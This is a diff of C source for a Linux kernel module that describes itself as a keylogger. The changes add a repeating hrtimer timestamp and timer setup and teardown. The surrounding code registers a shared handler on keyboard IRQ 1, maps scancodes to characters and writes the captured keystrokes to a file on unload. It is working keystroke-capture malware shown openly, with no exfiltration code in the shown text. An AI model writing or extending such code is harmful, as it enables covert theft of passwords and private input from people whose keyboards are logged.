@@ -8,6 +8,9 @@
 #include <linux/mutex.h>
 //#include <sharedVariable.h>
 
+#include <linux/hrtimer.h>
+#include <linux/sched.h>
+
 #ifndef __KERNEL__
 #define __KERNEL__
 #endif
@@ -20,7 +23,7 @@
 #define RIGHT_SHIFT_RELEASE 0xb6
 int shiftPressed = 0;
 
-// output constants/variables
+// output file constants/variables
 #define OUTPUT_MODE 0644
 const char* path = "./output.txt"; //temporary
 struct file *outfile;
@@ -33,6 +36,13 @@ char* char_buffer[B_SIZE];
 int pos = 0;
 int rollover = 0;
 
+// timer and timestamp variables
+static struct hrtimer ts_timer;
+static ktime_t ts_period;
+#define TS_TIMER_PERIOD 5
+#define TS_SIZE 10
+char timestamp[TS_SIZE];
+
 // FUNCTION PROTOTYPES
 struct file *createFile(const char *path);
 int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
@@ -41,7 +51,10 @@ static irqreturn_t get_scancode(int irq, void *dev_id);
 void scancode_to_key(char scancode);
 void check_shift(unsigned char scancode);
 void write_buffer_to_output(void);
-char* generate_timestamp(void);
+void generate_timestamp(void);
+static void initialize_timers(void);
+static enum hrtimer_restart print_timestamp(struct hrtimer * timer);
+static void remove_timers(void);
 
 //Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
 
@@ -166,12 +179,11 @@ void write_buffer_to_output(void)
 	printk("Character buffer written to output.\n");
 }
 
-char* generate_timestamp(void)
+void generate_timestamp(void)
 {
 	long total_sec;
 	int hr, min, sec;
     struct timeval time;
-	char timestamp[10];
 
     do_gettimeofday(&time);
 	total_sec = time.tv_sec;
@@ -183,7 +195,29 @@ char* generate_timestamp(void)
 	// build timestamp string
 	sprintf(timestamp, "[%d:%d:%d]", hr, min, sec);
 	printk("Time: %s", timestamp);
-	return *timestamp;
+}
+
+static void initialize_timers(void)
+{
+	// timestamp timer
+	ts_period = ktime_set(TS_TIMER_PERIOD, 0);
+	hrtimer_init(&ts_timer, CLOCK_REALTIME, HRTIMER_MODE_REL);
+	ts_timer.function = print_timestamp;
+	hrtimer_start(&ts_timer, ts_period, HRTIMER_MODE_REL);
+}
+
+static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
+{
+	// temp: print timestamp every 5 seconds
+	generate_timestamp();
+
+	hrtimer_forward_now(timer, ts_period);
+	return HRTIMER_RESTART;
+}
+
+static void remove_timers(void)
+{
+    hrtimer_cancel(&ts_timer);
 }
   
 MODULE_LICENSE("GPL");
@@ -192,8 +226,9 @@ MODULE_DESCRIPTION("A kernel-based keylogger module");
 int __init init_keylogger(void)
 {
 	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
-	generate_timestamp();
 	outfile = createFile(path);
+	generate_timestamp();
+	initialize_timers();
 	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
 	return 0;
 }
@@ -204,6 +239,7 @@ void __exit exit_module(void)
 	free_irq(1, (void *)get_scancode);
 	write_buffer_to_output();
 	closeFile(outfile);
+	remove_timers();	
 	return;
 }
 
